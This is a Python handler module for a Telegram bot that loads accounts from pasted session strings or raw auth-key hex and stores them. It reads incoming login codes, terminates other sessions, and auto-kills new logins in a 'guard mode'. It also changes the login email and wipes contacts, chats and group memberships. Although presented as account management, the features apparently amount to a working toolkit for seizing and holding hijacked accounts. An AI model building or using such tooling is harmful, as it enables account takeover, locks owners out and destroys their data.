import asyncio
import logging

from telegram import Update
from telegram.ext import (
    ContextTypes,
    CallbackQueryHandler,
    CommandHandler,
    MessageHandler,
    filters,
    ConversationHandler,
)
from telethon import functions
from telethon.tl import types
from telethon.errors import CodeInvalidError, RPCError

from config import API_ID, API_HASH
from database.models import (
    save_account,
    get_account_by_id,
    delete_account,
    get_mail,
    save_mail,
    set_last_otp,
    update_account,
    is_authorized,
)
from keyboards.inline import (
    manage_dashboard_kb,
    device_dashboard_kb,
    terminate_confirm_kb,
    revoke_bot_confirm_kb,
    clear_all_confirm_kb,
    otp_menu_kb,
    back_to_dashboard_kb,
    cancel_kb,
    main_menu_kb,
)
from utils.helpers import (
    check_spam_status,
    get_devices,
    terminate_device,
    clear_all_data,
    fetch_otp,
    verify_mail,
    format_account_info,
    format_device,
    safe_edit,
    denied_text,
)
from utils.session_utils import verify_and_get_client
from utils.guard import GuardManager, start_guard

logger = logging.getLogger(__name__)

# Conversation states
(
    WAITING_HEX,
    DASHBOARD,
    DEVICE_LIST,
    CONFIRM_TERMINATE,
    CONFIRM_REVOKE,
    CONFIRM_CLEAR,
    WAITING_CHANGE_MAIL_EMAIL,
    WAITING_CHANGE_MAIL_CODE,
) = range(8)


def _get_client(context):
    return context.user_data.get("current_client")


async def _drop_client(context):
    client = context.user_data.pop("current_client", None)
    if client and client.is_connected():
        try:
            await client.disconnect()
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════════════════
#  ENTRY
# ═══════════════════════════════════════════════════════════════════════════
async def manage_account_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    logger.info("🔑 Manage Account button clicked by %s (callback=%s)",
                update.effective_user.id, query.data)

    if not await is_authorized(update.effective_user.id):
        await safe_edit(query, denied_text(update.effective_user.id))
        return ConversationHandler.END

    # Clean up any stale client from a previous run
    await _drop_client(context)
    for key in list(context.user_data.keys()):
        if key.startswith(("current_", "device_", "pending_")):
            context.user_data.pop(key, None)

    await safe_edit(query, 
        "🔑 **Manage Account**\n\n"
        "Please send your Telegram **session string**. Supported formats:\n"
        "├─ Telethon `StringSession`\n"
        "├─ Pyrogram session string\n"
        "└─ Raw 256-byte auth-key hex (512 chars) — DC auto-probed\n\n"
        "_The bot will verify the session and load the dashboard._",
        parse_mode="Markdown",
        reply_markup=cancel_kb("manage"),
    )
    return WAITING_HEX


# ═══════════════════════════════════════════════════════════════════════════
#  RECEIVE HEX
# ═══════════════════════════════════════════════════════════════════════════
async def receive_hex(update: Update, context: ContextTypes.DEFAULT_TYPE):
    hex_string = update.message.text.strip()
    user_id = update.effective_user.id

    status_msg = await update.message.reply_text(
        "🔑 Connecting to hex auth key...\nVerifying session…",
        parse_mode="Markdown",
    )

    client, info = await verify_and_get_client(hex_string, API_ID, API_HASH)

    if client is None:
        await status_msg.edit_text(
            f"❌ **Verification Failed**\n\n{info}",
            parse_mode="Markdown",
            reply_markup=cancel_kb("manage"),
        )
        return WAITING_HEX

    try:
        devices = await get_devices(client)
        spam_status = await check_spam_status(client)

        name = f"{info.get('first_name', '')} {info.get('last_name', '')}".strip()
        account_id = await save_account(
            owner_id=user_id,
            hex_key=hex_string,
            phone=info.get("phone", "Unknown"),
            name=name or "Unknown",
            user_id=info.get("id", 0),
            dc_id=info.get("dc_id", 0),
            session_string=info.get("session_string", ""),
        )

        context.user_data["current_client"] = client
        context.user_data["current_account_id"] = str(account_id)
        context.user_data["current_user_id"] = info["id"]
        context.user_data["current_phone"] = info.get("phone", "Unknown")
        context.user_data["current_name"] = name or "Unknown"

        dash_text = format_account_info(info)
        dash_text += (
            f"├─ **Devices**  : {len(devices)} connected\n"
            f"├─ **Spam**     : {spam_status}\n"
            f"└─ **Status**   : ✅ **Verified & Connected**"
        )

        await status_msg.edit_text(
            dash_text,
            parse_mode="Markdown",
            reply_markup=manage_dashboard_kb(),
        )
        return DASHBOARD

    except Exception as e:
        if client and client.is_connected():
            try:
                await client.disconnect()
            except Exception:
                pass
        await _drop_client(context)
        await status_msg.edit_text(
            f"❌ **Error**\n\n{e}",
            parse_mode="Markdown",
            reply_markup=cancel_kb("manage"),
        )
        return WAITING_HEX


# ═══════════════════════════════════════════════════════════════════════════
#  DASHBOARD
# ═══════════════════════════════════════════════════════════════════════════
async def _refresh_dashboard(update, context):
    query = update.callback_query
    client = _get_client(context)

    if not client or not client.is_connected():
        await safe_edit(query, 
            "❌ Session expired. Reconnect from the main menu.",
            reply_markup=main_menu_kb(),
        )
        return ConversationHandler.END

    me = await client.get_me()
    devices = await get_devices(client)
    spam_status = await check_spam_status(client)

    info = {
        "id": me.id,
        "phone": getattr(me, "phone", "Unknown"),
        "first_name": getattr(me, "first_name", ""),
        "last_name": getattr(me, "last_name", ""),
        "username": getattr(me, "username", ""),
        "dc_id": getattr(client.session, "dc_id", 0),
    }

    text = format_account_info(info)
    text += f"├─ **Devices**  : {len(devices)} connected\n"
    text += f"├─ **Spam**     : {spam_status}\n"
    text += f"└─ **Status**   : ✅ Connected"

    await safe_edit(query, text, parse_mode="Markdown", reply_markup=manage_dashboard_kb())
    return DASHBOARD


async def dashboard_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "mng_devices":
        return await show_devices(update, context)
    if data == "mng_clear_all":
        return await ask_clear_all(update, context)
    if data == "mng_fetch_otp":
        return await show_otp_menu(update, context)
    if data == "mng_change_mail":
        return await ask_change_mail_email(update, context)
    if data == "mail_check":
        return await check_mail_dash(update, context)
    if data == "otp_read":
        return await read_otp(update, context)
    if data == "mng_back_dash":
        return await _refresh_dashboard(update, context)
    return DASHBOARD


# ═══════════════════════════════════════════════════════════════════════════
#  DEVICE DASHBOARD
# ═══════════════════════════════════════════════════════════════════════════
async def show_devices(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    client = _get_client(context)

    if not client or not client.is_connected():
        await safe_edit(query, "❌ Session lost.", reply_markup=main_menu_kb())
        return ConversationHandler.END

    devices = await get_devices(client)
    context.user_data["device_list"] = devices

    if not devices:
        await safe_edit(query, 
            "📱 **Device Dashboard**\n\nNo active sessions found.",
            parse_mode="Markdown",
            reply_markup=back_to_dashboard_kb(),
        )
        return DEVICE_LIST

    text = "📱 **Device Dashboard**\n\n"
    for i, dev in enumerate(devices):
        text += format_device(dev, i) + "\n"
    text += "_Tap a device below to terminate it._"

    manager = GuardManager(context.application)
    account_uid = context.user_data.get("current_user_id")
    guard_active = account_uid is not None and manager.get(
        manager.key(update.effective_user.id, account_uid)
    ) is not None

    await safe_edit(query, 
        text,
        parse_mode="Markdown",
        reply_markup=device_dashboard_kb(devices, guard_active),
    )
    return DEVICE_LIST


async def device_action_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    client = _get_client(context)

    if not client or not client.is_connected():
        await safe_edit(query, "❌ Session lost.", reply_markup=main_menu_kb())
        return ConversationHandler.END

    devices = context.user_data.get("device_list", [])

    # ── Ask to terminate a specific device ──────────────────────────
    if data.startswith("dev:"):
        idx = int(data.split(":", 1)[1])
        if 0 <= idx < len(devices):
            dev = devices[idx]
            await safe_edit(query, 
                f"⚠️ **Terminate This Device?**\n\n{format_device(dev, idx)}",
                parse_mode="Markdown",
                reply_markup=terminate_confirm_kb(idx),
            )
            return CONFIRM_TERMINATE

    # ── Confirm termination ─────────────────────────────────────────
    elif data.startswith("dev_yes:"):
        idx = int(data.split(":", 1)[1])
        if 0 <= idx < len(devices):
            dev_hash = devices[idx]["hash"]
            await safe_edit(query, "🔄 Terminating device...")
            ok = await terminate_device(client, dev_hash)
            await safe_edit(query, 
                "✅ **Device terminated!**" if ok else "❌ Failed to terminate device."
            )
            await asyncio.sleep(0.5)
            return await show_devices(update, context)

    # ── Cancel ──────────────────────────────────────────────────────
    elif data == "dev_no":
        return await show_devices(update, context)

    # ── Terminate all OTHER sessions ────────────────────────────────
    elif data == "revoke_all":
        await safe_edit(query, "🔌 Terminating all other sessions...")
        ok_count = fail_count = 0
        for dev in devices:
            if not dev.get("current"):
                if await terminate_device(client, dev["hash"]):
                    ok_count += 1
                else:
                    fail_count += 1
        await safe_edit(query, 
            f"🔌 **Terminate All Sessions**\n\n"
            f"├─ Terminated: {ok_count}\n"
            f"└─ Failed: {fail_count}\n\n"
            "_Your current session is preserved._",
            parse_mode="Markdown",
            reply_markup=back_to_dashboard_kb(),
        )
        return DEVICE_LIST

    # ── Toggle guard mode for this account ──────────────────────────
    elif data == "guard_toggle":
        user_id = update.effective_user.id
        account_uid = context.user_data.get("current_user_id")
        account_id = context.user_data.get("current_account_id")
        manager = GuardManager(context.application)
        key = manager.key(user_id, account_uid)

        if manager.get(key):
            await manager.stop(key, notify=True)
            if account_id:
                await update_account(account_id, {"guard_active": False})
            await safe_edit(query, "🛡️ **Guard mode OFF** for this account.")
        else:
            await start_guard(context.application, user_id, account_uid,
                              client, update.effective_chat.id)
            if account_id:
                await update_account(account_id, {"guard_active": True})
            await safe_edit(query, 
                "🛡️ **Guard mode ON** for this account.\n\n"
                "Any new login will be terminated automatically.")
        await asyncio.sleep(1)
        return await show_devices(update, context)

    # ── Revoke bot connection (confirm) ─────────────────────────────
    elif data == "revoke_bot":
        await safe_edit(query, 
            "🔴 **Revoke Bot Connection?**\n\n"
            "This disconnects the bot from this account and **removes the stored "
            "account** from the database.\n\n"
            "_Your own Telegram sessions are untouched._",
            parse_mode="Markdown",
            reply_markup=revoke_bot_confirm_kb(),
        )
        return CONFIRM_REVOKE

    elif data == "revoke_bot_yes":
        account_id = context.user_data.get("current_account_id")
        account_uid = context.user_data.get("current_user_id")
        try:
            await _drop_client(context)
            if account_uid:
                manager = GuardManager(context.application)
                await manager.stop_for_user(
                    update.effective_user.id, account_uid=account_uid, notify=False
                )
            if account_id:
                await delete_account(account_id)
            await safe_edit(query, 
                "✅ **Bot connection revoked & account removed.**",
                reply_markup=main_menu_kb(),
            )
        except Exception as e:
            await safe_edit(query, f"❌ Error: {e}", reply_markup=main_menu_kb())
        return ConversationHandler.END

    return DEVICE_LIST


# ═══════════════════════════════════════════════════════════════════════════
#  CLEAR ALL — inline confirm buttons (no typing required)
# ═══════════════════════════════════════════════════════════════════════════
async def ask_clear_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await safe_edit(query, 
        "⚠️ **⚠️ DESTRUCTIVE ACTION ⚠️**\n\n"
        "This will **permanently erase**:\n"
        "├─ All contacts\n"
        "├─ All private chats (DMs)\n"
        "├─ All group chats (and leave them)\n"
        "├─ All channels (and leave them)\n"
        "└─ Saved messages history\n\n"
        "_This is irreversible. Confirm with the button below._",
        parse_mode="Markdown",
        reply_markup=clear_all_confirm_kb(),
    )
    return CONFIRM_CLEAR


async def handle_clear_all_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "clr_no":
        return await _refresh_dashboard(update, context)

    client = _get_client(context)
    if not client or not client.is_connected():
        await safe_edit(query, "❌ Session lost.", reply_markup=main_menu_kb())
        return ConversationHandler.END

    await safe_edit(query, "🗑️ Clearing all data... This may take a minute.")
    result = await clear_all_data(client)

    await safe_edit(query, 
        "✅ **Clear Complete**\n\n"
        f"├─ Contacts deleted: {result['contacts']}\n"
        f"├─ DMs removed: {result['dialogs']}\n"
        f"├─ Groups/channels left: {result['left']}\n"
        f"└─ Errors: {result['errors']}",
        parse_mode="Markdown",
        reply_markup=manage_dashboard_kb(),
    )
    return DASHBOARD


# ═══════════════════════════════════════════════════════════════════════════
#  FETCH OTP
# ═══════════════════════════════════════════════════════════════════════════
async def show_otp_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    client = _get_client(context)

    if not client or not client.is_connected():
        await safe_edit(query, "❌ Session lost.", reply_markup=main_menu_kb())
        return ConversationHandler.END

    me = await client.get_me()
    phone = getattr(me, "phone", "Unknown")
    name = f"{getattr(me, 'first_name', '')} {getattr(me, 'last_name', '')}".strip()

    text = (
        f"📨 **Fetch OTP**\n\n"
        f"Account: **{name}**\n"
        f"Phone: `{phone}`\n\n"
        f"Tap below to read the latest login code."
    )
    await safe_edit(query, text, parse_mode="Markdown", reply_markup=otp_menu_kb())
    return DASHBOARD


async def read_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    client = _get_client(context)

    if not client or not client.is_connected():
        await safe_edit(query, "❌ Session lost.", reply_markup=main_menu_kb())
        return ConversationHandler.END

    await safe_edit(query, "🔍 Searching for OTP (this can take ~30s)...")

    account_id = context.user_data.get("current_account_id")
    account = await get_account_by_id(account_id) if account_id else None
    last_otp = account.get("last_otp") if account else None

    otp = await fetch_otp(client, attempts=8, delay=2.5)

    me = await client.get_me()
    phone = getattr(me, "phone", "Unknown")
    name = f"{getattr(me, 'first_name', '')} {getattr(me, 'last_name', '')}".strip()

    if otp:
        await set_last_otp(account_id, otp)
        if last_otp and last_otp == otp:
            text = (
                f"📨 **OTP (same as last time)**\n\n"
                f"Account: **{name}**\nPhone: `{phone}`\n\n"
                f"📨 **Code:** `{otp}`\n\n_Tap again to re-fetch._"
            )
        else:
            text = (
                f"✅ **OTP Found!**\n\n"
                f"Account: **{name}**\nPhone: `{phone}`\n\n"
                f"📨 **Code:** `{otp}`\n\n_Tap again to re-fetch._"
            )
    elif last_otp:
        text = (
            f"ℹ️ **No new OTP found.**\n\n"
            f"Account: **{name}**\nPhone: `{phone}`\n\n"
            f"📨 **Last OTP:** `{last_otp}`\n\n"
            f"_Request a new login code and tap again._"
        )
    else:
        text = (
            f"❌ **No OTP found.**\n\n"
            f"Account: **{name}**\nPhone: `{phone}`\n\n"
            f"Make sure a login code was sent to this account, then tap again."
        )

    await safe_edit(query, text, parse_mode="Markdown", reply_markup=otp_menu_kb())
    return DASHBOARD


# ═══════════════════════════════════════════════════════════════════════════
#  MAIL CHECKER
# ═══════════════════════════════════════════════════════════════════════════
async def _check_mail(update, context):
    """Verify the saved mail via IMAP. Returns (text, ok)."""
    user_id = update.effective_user.id
    mail = await get_mail(user_id)
    if not mail:
        return (
            "❌ **No saved mail.**\n\n"
            "Use `/addmail email app_password` first, then try again.",
            False,
        )

    email_address = mail["email"]
    app_password = mail["app_password"]
    result = await verify_mail(email_address, app_password)

    if result.get("ok"):
        await save_mail(user_id, email_address, app_password,
                        verified=True, check_message="OK")
        text = (
            "✅ **Mail Verified**\n\n"
            f"├─ Email: `{email_address}`\n"
            f"├─ IMAP: {result.get('host')}\n"
            f"├─ Unread: {result.get('unread')}\n"
            f"└─ Telegram emails: {result.get('telegram_emails')}\n"
        )
        if result.get("latest"):
            text += f"\nLatest: `{result['latest']}`"
        return text, True

    await save_mail(user_id, email_address, app_password,
                    verified=False, check_message=str(result.get("error")))
    return (
        f"❌ **Mail check failed**\n\n`{email_address}`\n\n{result.get('error')}",
        False,
    )


async def check_mail_dash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await safe_edit(query, "🧪 Checking mail...")
    text, _ = await _check_mail(update, context)
    await safe_edit(query, text, parse_mode="Markdown", reply_markup=manage_dashboard_kb())
    return DASHBOARD


# ═══════════════════════════════════════════════════════════════════════════
#  CHANGE LOGIN MAIL (manual OTP flow)
# ═══════════════════════════════════════════════════════════════════════════
async def ask_change_mail_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check for a login-email option, show the current mail, ask for the new one."""
    query = update.callback_query
    await query.answer()
    client = _get_client(context)

    if not client or not client.is_connected():
        await safe_edit(query, "❌ Session lost.", reply_markup=main_menu_kb())
        return ConversationHandler.END

    try:
        pwd = await client(functions.account.GetPasswordRequest())
    except RPCError as e:
        await safe_edit(query, f"❌ Could not read account status: {e}",
                        reply_markup=manage_dashboard_kb())
        return DASHBOARD

    current = (getattr(pwd, "login_email_pattern", "") or "").strip()
    if not current:
        await safe_edit(query, 
            "❌ **This account doesn't have a login mail option.**\n\n"
            "No login email is configured on this account, so there is nothing "
            "to change.",
            parse_mode="Markdown",
            reply_markup=manage_dashboard_kb(),
        )
        return DASHBOARD

    await safe_edit(query, 
        f"📧 **Change Login Email**\n\n"
        f"├─ Current login email: `{current}`\n\n"
        f"Send the **new email address** you want to use as the login email.",
        parse_mode="Markdown",
        reply_markup=cancel_kb("change_mail"),
    )
    return WAITING_CHANGE_MAIL_EMAIL


async def receive_change_mail_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive the new email, send the verification code to it, ask for the code."""
    email = update.message.text.strip()
    client = _get_client(context)

    if not client or not client.is_connected():
        await update.message.reply_text("❌ Session lost.", reply_markup=main_menu_kb())
        return ConversationHandler.END

    if "@" not in email or "." not in email:
        await update.message.reply_text(
            "❌ Invalid email. Send a valid email address.",
            reply_markup=cancel_kb("change_mail"),
        )
        return WAITING_CHANGE_MAIL_EMAIL

    context.user_data["pending_email"] = email

    try:
        await client(functions.account.SendVerifyEmailCodeRequest(
            purpose=types.EmailVerifyPurposeLoginChange(),
            email=email,
        ))
    except RPCError as e:
        await update.message.reply_text(
            f"❌ Could not send verification code: {e}",
            reply_markup=cancel_kb("change_mail"),
        )
        return WAITING_CHANGE_MAIL_EMAIL

    await update.message.reply_text(
        f"📧 Verification code sent to `{email}`.\n\n"
        f"Send the **code** you received.",
        parse_mode="Markdown",
        reply_markup=cancel_kb("change_mail"),
    )
    return WAITING_CHANGE_MAIL_CODE


async def receive_change_mail_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive the OTP and finish the login-email change."""
    code = update.message.text.strip()
    email = context.user_data.get("pending_email")
    client = _get_client(context)

    if not client or not client.is_connected():
        await update.message.reply_text("❌ Session lost.", reply_markup=main_menu_kb())
        return ConversationHandler.END

    try:
        await client(functions.account.VerifyEmailRequest(
            purpose=types.EmailVerifyPurposeLoginChange(),
            verification=types.EmailVerificationCode(code=code),
        ))
    except CodeInvalidError:
        await update.message.reply_text(
            "❌ Invalid code. Send the correct code.",
            reply_markup=cancel_kb("change_mail"),
        )
        return WAITING_CHANGE_MAIL_CODE
    except RPCError as e:
        await update.message.reply_text(
            f"❌ Verification failed: {e}",
            reply_markup=cancel_kb("change_mail"),
        )
        return WAITING_CHANGE_MAIL_CODE

    await update.message.reply_text(
        f"✅ **Mail updated!**\n\nNew login email: `{email}`",
        parse_mode="Markdown",
        reply_markup=manage_dashboard_kb(),
    )
    return DASHBOARD


# ═══════════════════════════════════════════════════════════════════════════
#  CANCEL
# ═══════════════════════════════════════════════════════════════════════════
async def cancel_manage(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query:
        await query.answer()

    await _drop_client(context)
    for key in list(context.user_data.keys()):
        if key.startswith(("current_", "device_", "pending_")):
            context.user_data.pop(key, None)

    from handlers.start import WELCOME_TEXT

    if query:
        await safe_edit(query, WELCOME_TEXT, parse_mode="Markdown", reply_markup=main_menu_kb())
    elif update.message:
        await update.message.reply_text(WELCOME_TEXT, parse_mode="Markdown", reply_markup=main_menu_kb())
    return ConversationHandler.END


# ═══════════════════════════════════════════════════════════════════════════
#  REGISTRATION
# ═══════════════════════════════════════════════════════════════════════════
def get_manage_conversation_handler():
    return ConversationHandler(
        entry_points=[CallbackQueryHandler(manage_account_entry, pattern=r"^manage_account$")],
        states={
            WAITING_HEX: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_hex),
                CallbackQueryHandler(cancel_manage, pattern=r"^cancel_manage$"),
            ],
            DASHBOARD: [
                CallbackQueryHandler(dashboard_handler, pattern=r"^mng_|^otp_read$|^mail_check$"),
                CallbackQueryHandler(cancel_manage, pattern=r"^cancel_"),
            ],
            DEVICE_LIST: [
                CallbackQueryHandler(
                    device_action_handler,
                    pattern=r"^dev:|^dev_yes:|^dev_no$|^revoke_all$|^revoke_bot$|^guard_toggle$",
                ),
                CallbackQueryHandler(dashboard_handler, pattern=r"^mng_back_dash$"),
                CallbackQueryHandler(cancel_manage, pattern=r"^cancel_"),
            ],
            CONFIRM_TERMINATE: [
                CallbackQueryHandler(device_action_handler, pattern=r"^dev_yes:|^dev_no$"),
                CallbackQueryHandler(cancel_manage, pattern=r"^cancel_"),
            ],
            CONFIRM_REVOKE: [
                CallbackQueryHandler(device_action_handler, pattern=r"^revoke_bot_yes$|^dev_no$"),
                CallbackQueryHandler(cancel_manage, pattern=r"^cancel_"),
            ],
            CONFIRM_CLEAR: [
                CallbackQueryHandler(handle_clear_all_confirm, pattern=r"^clr_yes$|^clr_no$"),
                CallbackQueryHandler(cancel_manage, pattern=r"^cancel_"),
            ],
            WAITING_CHANGE_MAIL_EMAIL: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_change_mail_email),
                CallbackQueryHandler(cancel_manage, pattern=r"^cancel_"),
            ],
            WAITING_CHANGE_MAIL_CODE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_change_mail_code),
                CallbackQueryHandler(cancel_manage, pattern=r"^cancel_"),
            ],
        },
        fallbacks=[
            CallbackQueryHandler(cancel_manage, pattern=r"^back_main$"),
            CommandHandler("cancel", cancel_manage),
        ],
        name="manage_account",
        persistent=False,
    )


def register(application):
    application.add_handler(get_manage_conversation_handler())
